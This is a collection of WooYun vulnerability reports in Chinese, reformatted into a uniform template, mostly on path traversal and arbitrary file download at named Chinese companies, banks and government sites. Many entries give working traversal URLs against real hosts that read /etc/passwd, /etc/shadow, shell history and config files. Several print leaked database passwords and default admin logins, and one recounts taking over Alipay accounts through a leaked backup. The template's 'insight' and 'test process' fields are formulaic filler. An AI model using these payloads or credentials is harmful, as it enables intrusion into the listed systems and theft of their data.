**详情**: GET /wapdata?File=../../../../../../../../../../etc/httpd/conf/httpd.conf&Page=1&t=1438273990794&Type=all HTTP/1.1Referer: http://news.sogou.comCookie: IPLOC=CN3100; SUV=00750D7765E314DB55BA51AC8107D393; SUID=DB14E3653C20950A0000000055BA51AC; JSESSIONID=aaaWoI23wKfzA75qXZF7u; usid=ihQQrthLK8VYj7Ff; ABTEST=7|1438273968|v1Host: news.sogou.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Ag

**POC**: root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mai

**绕过**: 直接利用

**修复**: 限定不可读取本地文件
---

---
### [wooyun-2014-084863] 某市住房和城乡建设局任意文件下载
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 延吉市住房和城乡建设局http://www.yjzjj.gov.cn/downfile.php?filename=../../downfile.php

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 权限问题
---

---
### [wooyun-2014-087025] 美的论坛敏感信息泄露
**厂商**: bbs.midea.com | **年份**: 2014 | **类型**: 用户资料大量泄漏

**元思考**: 触发信号: 功能测试

**洞察**: 用户资料大量泄漏防护不足，开发者信任前端输入

**测试流程**:
1. 识别用户资料大量泄漏相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://bbs.midea.com/ 目录遍历http://bbs.midea.com/bbs/config/config_global.php_bak$_config['db']['1']['dbhost'] = 'localhost';$_config['db']['1']['dbuser'] = 'root';$_config['db']['1']['dbpw'] = 'wwwapp@123';$_config['db']['1']['dbcharset'] = 'utf8';$_config['db']['1']['pconnect'] = '0';$_config['db']['1']['dbname'] = 'mideabbs';$_config['db']['1']['tablepre'] = 'BBS_';这是一个作死的节奏。我没有动数据。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 呵
---

---
### [wooyun-2015-0142978] 天安保险某系统存在任意文件读取漏洞（疑似某通用理赔管理系统）
**厂商**: 天安保险股份有限公司 | **年份**: 2015 | **类型**: 文件包含

**元思考**: 触发信号: 功能测试

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 我找了一上午，这是第二枚。因为没有足够多的案例证明其通用性，含着泪只好单发了问题厂商：北京精友世纪软件技术有限公司版本号：V4.1上一个漏洞的版本是V2.5，所以我只能认为问题出在V2.5~V4.1中系统外观问题链接http://*/autoclaim/jsp/picture/picture_stream.jsp具体地址http://**.**.**.**/autoclaim/jsp/picture/picture_stream.jsp如下：http://**.**.**.**/autoclaim/jsp/picture/picture_stream.jsp?filep=/../../../../../../../../../../../../etc/passwd

**POC**: http://**.**.**.**/autoclaim/jsp/picture/picture_stream.jsp?filep=/../../../../../../../../../../../../etc/hostshttp://**.**.**.**/autoclaim/jsp/picture/picture_stream.jsp?filep=/../../../../../../../../../../../../home/weblogic/.bash_history找到站点路径/app/deployment/jingyou/autoclaim/http://**.**.**.**

**绕过**: 直接利用

**修复**: 过滤，顺便加权限控制
---

---
### [wooyun-2015-091115] 中国移动几个小漏洞
**厂商**: 中国移动 | **年份**: 2015 | **类型**: 应用配置错误

**元思考**: 触发信号: 功能测试

**洞察**: 应用配置错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别应用配置错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://223.202.47.147  OpenSSLhttp://tongji.cmri.cn/misc/ 目录遍历223.202.47.151:8080 admin/admin

**POC**: https://223.202.47.147  OpenSSLhttp://tongji.cmri.cn/misc/ 目录遍历223.202.47.151:8080 admin/admin

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2010-0983] 商务中国目录遍历漏洞
**厂商**: bizcn.com | **年份**: 2010 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://bizcn.com/%3f.jsphttp://bizcn.com/default/%3f.jsp

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 不用
---

---
### [wooyun-2014-054143] 某政务系统通用任意文件下载 多个政府网站实例 2
**厂商**: 某政务系统 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: /showIssueContentAction.do?jsecuKeyNumberStr=1216454164954&action=downloadFile&path=/website/index.jsphttp://www.google.com.tw/#newwindow=1&q=inurl:gov.cn+showIssueContentAction.do&start=101.http://www.xinxing.gov.cn/showIssueContentAction.do?jsecuKeyNumberStr=1216454164954&action=downloadFile&path=/website/index.jsp2.http://www.yunfu.gov.cn/showIssueContentAction.do?jsecuKeyNumberStr=121645416495

**POC**: 1.http://www.xinxing.gov.cn/showIssueContentAction.do?jsecuKeyNumberStr=1216454164954&action=downloadFile&path=/website/index.jsp2.http://www.yunfu.gov.cn/showIssueContentAction.do?jsecuKeyNumberStr=1216454164954&action=downloadFile&path=/website/index.jsp3.http://sp.yulin.gov.cn/showIssueContentAct

**绕过**: 直接利用

**修复**: 挂WAF（因为我碰到了某些网站明显有统一部署的WAF）
---

---
### [wooyun-2016-0188374] 立方网某分站目录遍历导致信息泄露已进官网后台
**厂商**: l99.com | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://piwik.l99.com 存在目录遍历~在目录下config有备份的数据库信息然后解密登录进去 登录邮箱各种数据泄漏 这张好貌似权限很大呀~好吧网络安全部门- -我想多了进行邮箱爆破 还是有默认密码的

**POC**: 在邮箱里找到了官网账号与密码~

**绕过**: 直接利用

**修复**: 恩~~~自己好好检查吧~~来确认的话 我就继续发你们漏洞了~ 不确认就算了
---

---
### [wooyun-2013-041487] 360wifi轻插一次可实现永久控制
**厂商**: 奇虎360 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在file://C:\Users\用户名\AppData\Roaming\360CloudWifi\expuser.log路径里，如下：之后你把这两个值写到以下python文件里。#coding=utf-8import urllibimport urllib2import hashlibfrom xml.dom import minidomgetconf_url = "http://w.yunpan.360.cn/intf.php";login_url = "http://w%s.yunpan.360.cn/intf.php?method=WifiUser.login&qid=%s&devtype=Wifi&v=&devid=%s&devname=&rtick=6198368&sign=%s&"detail_url = "http://api%s.yunpan.360.cn/intf.ph

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们更专业
---

---
### [wooyun-2016-0211794] 新浪某站存在任意文件下载漏洞
**厂商**: 新浪 | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 新浪某站存在任意文件下载漏洞网站地址：http://admin.pay.sina.comhttp://admin.pay.sina.com/..//..//..//..//..///etc/passwd好了，就这些了

**POC**: 新浪某站存在任意文件下载漏洞网站地址：http://admin.pay.sina.comhttp://admin.pay.sina.com/..//..//..//..//..///etc/passwd好了，就这些了

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2013-018817] CCTV某分站任意文件下载漏洞
**厂商**: 中国网络电视台 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://golf.cctv.com/e/DownSys/DownPic/index.php?down_file=可以直接输入文件名进行下载，导致任意文件下载漏洞

**POC**: http://golf.cctv.com/e/DownSys/DownPic/?down_file=../../class/config.php

**绕过**: 直接利用

**修复**: 过滤吧
---

---
### [wooyun-2014-088415] 中关村在线某系统任意文件读取
**厂商**: 中关村在线 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://mail.zol.com.cn/login.php?Lang=invalid../../../../../../../../../../etc/passwd/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 哈
---

---
### [wooyun-2015-0141440] Hsort报刊管理多处越权操作
**厂商**: 北京水天科技有限公司 | **年份**: 2015 | **类型**: 非授权访问/权限绕过

**元思考**: 触发信号: 功能测试

**洞察**: 非授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别非授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 以http://**.**.**.**/为例#1 目录遍历http://**.**.**.**/Admin/fileManage.aspx?action=LIST&value1=~%2Fadmin%2F&value2=修改value1的值为相应的路径，就可以列出该目录下的文件和文件夹http://**.**.**.**/Admin/fileManage.aspx?action=LIST&value1=~%2F&value2=#2 可以在任意位置新建目录http://**.**.**.**/Admin/fileManage.aspx?action=NEWDIR&value1=~%2Fsoft%2Fwooyun即在/soft/ 下新建一个名为wooyun的文件夹#3 可以删除任意文件http://**.**.**.**/Admin/fileManage.aspx?action=DELETE&v

**POC**: 其他测试案例：http://**.**.**.**//Admin/fileManage.aspx?action=LIST&value1=~%2Fadmin%2F&value2=http://**.**.**.**/Admin/fileManage.aspx?action=LIST&value1=~%2Fadmin%2F&value2=http://**.**.**.**/Admin/fileManage.aspx?action=LIST&value1=~%2Fadmin%2F&value2=http://**.**.**.**/Admin/fileManage.aspx?action=LIST

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-063875] 穷游网某漏洞造成一系列严重问题可沦陷官方支付宝账户[可提现]
**厂商**: 穷游网 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 不知道是否有精华？好了，我要开始讲述这个故事了。0x01:故事得先从2013年的某个秋天，批量扫了qyer.com的二级域名，当时扫完发现没有什么漏洞，便存着列表，没有去做什么。0x02:最近心血来潮，随便挑选了一个域名，biu.qyer.com。通过对以上域名的探测，我发现了一个轻微的信息泄漏：大概翻了一下没有什么进展。但是当我随手输入data目录想看看是否有数据文件的时候出现了以下场景：直觉告诉我有戏。在table目录下，我找到了biu.qyer.com的数据库备份：把sql文件下载回来之后，第一时间要做的，显然就是找对应用户破解密码进后台了。0x03:不出意料，biu.sql的确是一份网站的备份文件：通过对md5破解，运气不佳。仅仅破解出一个可以登录的用户，并且成功登录后台：后台没有特殊的功能，也就没有继续深入。0x04:测试思路如果稍微猥琐点？我突然想到了，这里有qyer.com的

**POC**: 0x05:还是一个运营妹子哦，而且还有很多招聘信息：通过对邮件的一些浏览：最最最关键的，有一位员工居然把支付宝修改的登录密码+支付密码也毫无保留的发送过来了：登录之后：再看星标邮件：又一个非常多￥的账户：登录下看看：上面的支付宝账户密码都拿到了的，而且支付密码也有的前提。考虑到深入的危害性，没有再继续了，邮件还有很多敏感内容。不一一贴出来，声明已经把所有敏感文件清理并且删除，望尽快收到漏洞详情之后修改对应账户密码！

**绕过**: 直接利用

**修复**: biu.qyer.com 目录权限设置的问题用户弱口令问题已经泄漏的用户问题。要修改的都修改下吧。
---

---
### [wooyun-2012-013902] 美图某分站，存在任意文件下载漏洞
**厂商**: 美图秀秀 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 查询子域名发现http://sina.moban.meitu.com/linjunjie/01/发现这个下载图片，是用file.PHP下载的试试看，能不能下载etc/PASSWD，成功了http://sina.moban.meitu.com/file.php?filename=../../../../etc/passwd

**POC**: http://sina.moban.meitu.com/file.php?filename=../../../../etc/passwd

**绕过**: 直接利用

**修复**: 不会
---

---
### [wooyun-2015-0142395] 阳光保险任意文件下载漏洞一枚
**厂商**: 阳光保险集团 | **年份**: 2015 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1,web.xmlhttp://kybpc.chexian.sinosig.com/easyInsurance/html5/downLoad.do?fileName=../web.xml2,log4j.xmlhttp://kybpc.chexian.sinosig.com/easyInsurance/html5/downLoad.do?fileName=../classes/log4j.xml

**POC**: curl -vv 'http://kybpc.chexian.sinosig.com/easyInsurance/html5/downLoad.do?fileName=../web.xml'* Hostname was NOT found in DNS cache*   Trying 111.203.203.13...* Connected to kybpc.chexian.sinosig.com (111.203.203.13) port 80 (#0)> GET /easyInsurance/html5/downLoad.do?fileName=../web.xml HTTP/1.1> U

**绕过**: 直接利用

**修复**: 我就不再深入了
---

---
### [wooyun-2015-099554] 应用汇某站点存在目录遍历漏洞
**厂商**: 应用汇 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://dev.appchina.com/测试账号  test / 123456登陆后发现两处目录遍历，任意文件下载漏洞：http://dev.appchina.com/market/common/download_banner.action?appId=100062&filename=../../../../../../../../../../etc/passwdhttp://dev.appchina.com/market/common/download_bigIcon.action?appId=100062&filename=../../../../../../../../../../etc/passwd

**POC**: 读passwd:root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/bin/shbin:x:2:2:bin:/bin:/bin/shsys:x:3:3:sys:/dev:/bin/shsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/bin/shman:x:6:12:man:/var/cache/man:/bin/shlp:x:7:7:lp:/var/spool/lpd:/bin/shmail:x:8:8:mail:/var/mail:/bin

**绕过**: 直接利用

**修复**: 参数过滤，限定base_dir
---

---
### [wooyun-2013-032877] 铁科院某文件下载泄露敏感信息
**厂商**: 铁科院 | **年份**: 2013 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 铁科院 下某文件下载 可至访问科院邮箱http://home.rails.cn/a.zip   http://www.rails.cn/a.zip这是什么呢？然后  看下说明：原来是下载  然后安装证书  还有：以及根证书的安装此外 无线说明总的就是这样  没有安装  事实是可行的。另外 提醒 铁科院  还是在员工会上强调一下弱口令的问题吧   这个是必然有的。ok  就这样。

**POC**: http://home.rails.cn/a.zip   http://www.rails.cn/a.zip这是什么呢？然后  看下说明：原来是下载  然后安装证书  还有：以及根证书的安装此外 无线说明总的就是这样  没有安装  事实是可行的。另外 提醒 铁科院  还是在员工会上强调一下弱口令的问题吧   这个是必然有的。ok  就这样。

**绕过**: 直接利用

**修复**: 。。。
---

---
### [wooyun-2015-0159711] 中山大学某站目录遍历漏洞#可获取服务器任意文件
**厂商**: 中山大学 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 0x01 漏洞描述中山大学教育发展校友事物办公室存在目录遍历漏洞，可任意获取服务器任何文件0x02 漏洞位置http://alumni.edaao.sysu.edu.cn/0x03 漏洞详细/xy/communityAlbum.do?fileName=../../../../../../../../../../etc/passwd&method=view即参数fileName存在此问题，可任意指定服务器路径获取文件

**POC**: 0x04 漏洞证明这里以linux服务器私密文件/etc/passwd为例下载文件内容如下root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownha

**绕过**: 直接利用

**修复**: 做好应用程序权限控制
---

---
### [wooyun-2012-014649] 我拉网分站任意文件下载
**厂商**: 55.la | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 上传功能

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 按照正常流程上传word，等转好之后查看下载链接：http://58.23.131.38:82/2pdf/down.aspx?fn=/down/2012/11/xx/xx/xxx.pdf尝试：http://58.23.131.38:82/2pdf/down.aspx?fn=down.aspxhttp://58.23.131.38:82/2pdf/down.aspx?fn=../web.confighttp://58.23.131.38:82/2pdf/down.aspx?fn=upload.aspxhttp://58.23.131.38:82/2pdf/down.aspx?fn=upload.aspx.cshttp://58.23.131.38:82/2pdf/down.aspx?fn=down.aspx.cshttp://58.23.131.38:82/2pdf/down.aspx?fn

**POC**: http://58.23.131.38:82/2pdf/down.aspx?fn=down.aspxhttp://58.23.131.38:82/2pdf/down.aspx?fn=../web.confighttp://58.23.131.38:82/2pdf/down.aspx?fn=upload.aspxhttp://58.23.131.38:82/2pdf/down.aspx?fn=upload.aspx.cshttp://58.23.131.38:82/2pdf/down.aspx?fn=down.aspx.cshttp://58.23.131.38:82/2pdf/down.asp

**绕过**: 直接利用

**修复**: 改下下载文件的代码吧
---

---
### [wooyun-2015-0139754] 青岛市安全生产监督管理局漏洞（涉及多个库）
**厂商**: 青岛市安全生产监督管理局 | **年份**: 2015 | **类型**: 后台弱口令

**元思考**: 触发信号: 功能测试

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 注入+弱口令+目录遍历http://**.**.**.**/manage/Login.aspxadmin 123456

**POC**: POST /manage/a.aspx HTTP/1.1Host: **.**.**.**Content-Length: 246Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://**.**.**.**User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-05048] 中国移动南京分公司导航站任意文件下载导致数据库口令泄露
**厂商**: 139移动互联 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 下载文件页面没有做限制导致任意文件下载http://www.njyd139.com/download.jsp?filename=../WEB-INF/web.xmlhttp://www.njyd139.com/download.jsp?filename=../../../conf/tomcat-users.xmlhttp://www.njyd139.com/download.jsp?filename=../index.jsphttp://www.njyd139.com/download.jsp?filename=../WEB-INF/classes/db/Dbhelper.class站点太简陋，没有进一步测试

**POC**: index.jsp 含有数据库用户名和密码Dbhelper db=new Dbhelper("njyd139","root","wabjtam2011");

**绕过**: 直接利用

**修复**: 过滤下载文件参数
---

---
### [wooyun-2015-0103820] 盛大某站文件远程包含任意文件下载目录读取
**厂商**: 盛大网络 | **年份**: 2015 | **类型**: 文件包含

**元思考**: 触发信号: 功能测试

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 都出之某个函数。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们专业
---

---
### [wooyun-2015-092411] 某农村信用社目录遍历
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网站目录遍历：可下载敏感信息：

**POC**: 网站目录遍历：可下载敏感信息：

**绕过**: 直接利用

**修复**: 加强权限
---

---
### [wooyun-2015-093317] 重庆三峡银行某站存在任意文件下载漏洞
**厂商**: www.ccqtgb.com | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 重庆三峡银行主站存在任意文件下载漏洞，可下载一些敏感信息。http://www.ccqtgb.com/download/download.jsp?filename=windows/win.ini&filepath=../../../../../../../../../../../windows/win.ini下载windows/win.ini; for 16-bit app support[fonts][extensions][mci extensions][files][Mail]MAPI=1

**POC**: http://www.ccqtgb.com/download/download.jsp?filename=windows/win.ini&filepath=../../../../../../../../../../../windows/win.ini下载windows/win.ini; for 16-bit app support[fonts][extensions][mci extensions][files][Mail]MAPI=1

**绕过**: 直接利用

**修复**: 修复方案你们懂的。
---

---
### [wooyun-2013-022008] 金蝶内部员工系统目录遍历、泄露服务器集群IP、财务收入报表等数据
**厂商**: 金蝶 | **年份**: 2013 | **类型**: 应用配置错误

**元思考**: 触发信号: 功能测试

**洞察**: 应用配置错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别应用配置错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://kdeas.kingdee.com//easWebClient/http://kdeas.kingdee.com/nap/http://kdeas.kingdee.com//client/http://global.kingdee.com/en/products/kis/http://login.mykingdee.com/login?service=http%3A%2F%2Fkdeas.kingdee.com%3A7888%2Feasportal%2F%3Bjsessionid%3DwKjIVx7QUW4U0KJcrnuDNk71l-2rDge04rYAhttp://web20.kingdee.com/downhttp://kdeas.kingdee.com/easfiles/easdoc/files/http://www.kingdee.com/sitemap.xml 网

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 更改配置 你懂的！
---

---
### [wooyun-2014-082598] 强智教务管理信息系统任意文件下载致多所学校沦陷打包部分学校（赤裸裸的sa）
**厂商**: qzdatasoft.com | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 关键字：版 权:长沙市强智科技发展有限责任公司·版权所有这只是我搜索的部分网站。http://58.18.213.238/jwgl/public/download.asp?filename=../jwjs/conn/connstring.asp.http://jiaowu.hustwenhua.net/public/download.asp?filename=../jwjs/conn/connstring.asp.http://219.148.49.53/jiaowu/public/download.asp?filename=../jwjs/conn/connstring.asp.http://e.tjmvti.cn/public/download.asp?filename=../jwjs/conn/connstring.asp.http://221.2.229.222/jiaowu/pu

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们更专业！
---

---
### [wooyun-2015-0120521] 1More任意文件读取泄露敏感信息(已登入邮箱)
**厂商**: 1More | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1more.com静态文件处理不当，可读取任意文件：http://www.1more.com/min?f=../../../../../../../../../../etc/nginx/nginx.conf%00.js

**POC**: 读取.bash_history，配置文件等：/etc/passwd/root/.bash_history/min?f=../../../../../../../../../../home/1morenick/.bash_history%00.js/min?f=../../../../../../../../../../etc/nginx/nginx.conf%00.js/min?f=../../../../../../../../../../opt/apache-tomcat-6.0.35-siteback/webapps/ROOT/WEB-INF/classes/log4j.properti

**绕过**: 直接利用

**修复**: 过滤，限定不可跨父目录
---

---
### [wooyun-2012-011021] 华夏银行某应用模块任意文件下载,源码泄露
**厂商**: 华夏银行 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 出问题的是在线客服系统其实文件下载是建立在源码泄露的基础上发现的,依旧是svn的问题http://looyu.hxb.com.cn/looyu/chat/.svn/text-base/down.jsp.svn-baseString  filename1  =  request.getParameter("file");没经过任何过滤，下面直接read 了

**POC**: 一般都是linux类的服务器，尝试读取密码文档http://looyu.hxb.com.cn/looyu/chat/down.jsp?file=../../etc/passwdhttp://looyu.hxb.com.cn/looyu/chat/down.jsp?file=../../etc/shadow初步尝试，未进行任何进一步操作。

**绕过**: 直接利用

**修复**: 升级svn,对所有涉及文件操作的地方进行过滤，限制！
---

---
### [wooyun-2015-0136103] 江西移动某站后台未授权访问可查用户手机缴费记录等信息+任意文件读取一处
**厂商**: 江西移动 | **年份**: 2015 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 参数注入, 后台管理

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 今天发现这么一个漏洞WooYun: 某敏感部门第一研究所集群管理系统存在任意文件读取漏洞平时喜欢收集一些这种漏洞，自己也准备找一个试试，结合搜索引擎，查到这么一个地址http://woxin.jxict.cn/jstorm-ui/cluster.jsf找个log，更改了一下参数，发现果然可以读取任意文件，并且还是root权限http://woxin.jxict.cn/jstorm-ui/log.jsf?clusterName=&host=10.180.117.12&port=7621&parent=.&log=../../../../../../../../../../etc/shadow用搜索引擎site了一下这个站点，发现竟然是江西移动一个叫我信的app官网，而且还搜到了一个后台地址http://woxin.jxict.cn/woxin-admin/query/exportClient

**POC**: 参考详细说明

**绕过**: 直接利用

**修复**: 1.限制jstrom-ui的访问2.后台功能校验权限3.使用普通权限账户运行tomcat
---

---
### [wooyun-2015-0123626] 激动网任意文件读取
**厂商**: 激动网 | **年份**: 2015 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 参考：http://wooyun.org/bugs/wooyun-2010-092390http://v.m.joy.cn/resin-doc/viewfile/?contextpath=/&servletpath=&file=WEB-INF/resin-web.xml

**POC**: 直接读取WEB-INF/一下列出webinf和首页读取

**绕过**: 直接利用

**修复**: 我是来找礼物的
---

---
### [wooyun-2014-061384] Anymacro 邮件系统任意文件下载漏洞（需登陆）
**厂商**: 北京安宁创新网络科技有限公司 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在mailattrFw.php中<?phprequire_once "config/config.php";require_once "include/template.php";require_once "include/func.php";require_once 'include/right.php';require_once 'include/func_login.php';require_once "include/auth.php";require_once "include/any_func.php";header('Content-type: image/jpeg');  //以图片方式输出echo file_get_contents($SESSION['maildir']."/tmp/".$F_cid); $SESSION['maildir']是固定值，$F_cid为从客

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2016-0198827] 同花顺某服务器配置不当(root权限任意文件读取)
**厂商**: 同花顺 | **年份**: 2016 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

